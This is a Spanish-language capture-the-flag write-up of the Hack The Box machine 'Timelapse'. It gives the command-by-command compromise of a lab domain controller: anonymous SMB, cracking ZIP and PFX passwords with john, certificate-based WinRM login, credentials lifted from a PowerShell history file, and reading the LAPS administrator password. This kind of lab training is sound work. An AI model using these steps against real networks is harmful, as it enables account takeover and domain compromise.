// 01

Resumen

Resumen. El DC expone un share Shares con acceso anónimo. Dentro, Dev/winrm_backup.zip contiene legacyy_dev_auth.pfx, un PKCS#12 con el certificado y la clave privada para autenticar por WinRM. Se crackea el ZIP (supremelegacy) y el PFX (thuglegacy), se extraen cert y clave y se entra por WinRM sobre SSL (5986) como legacyy. En su historial de PowerShell están las credenciales de svc_deploy, que pertenece a LAPS_Readers: con Get-ADComputer … ms-mcs-admpwd se lee la contraseña del administrador local del DC y se entra con ella.

// NOTA

Versión simplificada (la usada): dos john (zip y pfx), un openssl, y tres sesiones de evil-winrm con -S (SSL). Sin herramientas de AD de terceros.

// 03

Reconocimiento

SHELL
$ sudo nmap -sS -p- -n -Pn --min-rate 2500 --open 10.129.227.113
$ echo "10.129.227.113 timelapse.htb dc01.timelapse.htb" | sudo tee -a /etc/hosts
$ nxc smb timelapse.htb

Lo que se encontró: DC01, dominio timelapse.htb, WinRM solo en 5986 (SSL).

// 04

SMB anónimo → ZIP

SHELL
$ smbclient -L //timelapse.htb -N
# Shares Disk
$ smbclient -N //timelapse.htb/Shares -c 'cd Dev; get winrm_backup.zip'

Lo que se encontró: Shares con Dev/winrm_backup.zip (y HelpDesk/ con la documentación de LAPS, que es la pista de la escalada).

Trampa: nxc --shares falla con STATUS_USER_SESSION_DELETED; smbclient -N sí lista. Con nxc funciona -u cualquiera -p ''.

// 05

ZIP y PFX

SHELL
$ zip2john winrm_backup.zip > zip.hash
$ john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
# supremelegacy
 
$ unzip -P supremelegacy winrm_backup.zip # -> legacyy_dev_auth.pfx
 
$ python3 /usr/share/john/pfx2john.py legacyy_dev_auth.pfx > pfx.hash
$ john pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt
# thuglegacy
SHELL
$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -passin 'pass:thuglegacy' -out legacyy_dev_auth.key
$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -passin 'pass:thuglegacy' -out legacyy_dev_auth.crt

Lo que se encontró: contraseñas supremelegacy (ZIP) y thuglegacy (PFX), y los ficheros .crt/.key.

// 06

WinRM con certificado → legacyy

SHELL
$ evil-winrm -i timelapse.htb -S -c legacyy_dev_auth.crt -k legacyy_dev_auth.key

Lo que se encontró: shell timelapse\legacyy y la user flag:

[flag oculta]

Por qué funciona: el .pfx es una credencial de autenticación por certificado para WinRM; -S porque solo hay 5986, y -c/-k con el certificado y la clave.

// 07

Historial de PowerShell → svc_deploy

SHELL
$ type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
# $p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
# $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)

Lo que se encontró: svc_deploy / E3R$Q62^12p7PLlC%KWaxuaV.

SHELL
$ evil-winrm -i timelapse.htb -S -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'

// 08

LAPS → Administrator

SHELL
$ net user svc_deploy | findstr /i LAPS # *LAPS_Readers
$ Get-ADComputer DC01 -properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd
# k,Y4[e4)3bh7y+xJ}}@E7#E(
SHELL
$ evil-winrm -i timelapse.htb -S -u administrator -p 'k,Y4[e4)3bh7y+xJ}}@E7#E('

Lo que se encontró: shell de Administrator y la root flag, que no está en su escritorio sino en el de otro perfil:

SHELL
$ Get-Content C:\Users\TRX\Desktop\root.txt
# [flag oculta]

Por qué: HTB rota las flags y necesita un admin con contraseña estática; por eso existe TRX (Domain Admin) y ahí está root.txt.

// 09

Limpieza

No se modificó nada en la máquina (solo lecturas y sesiones de WinRM, que se cierran solas).
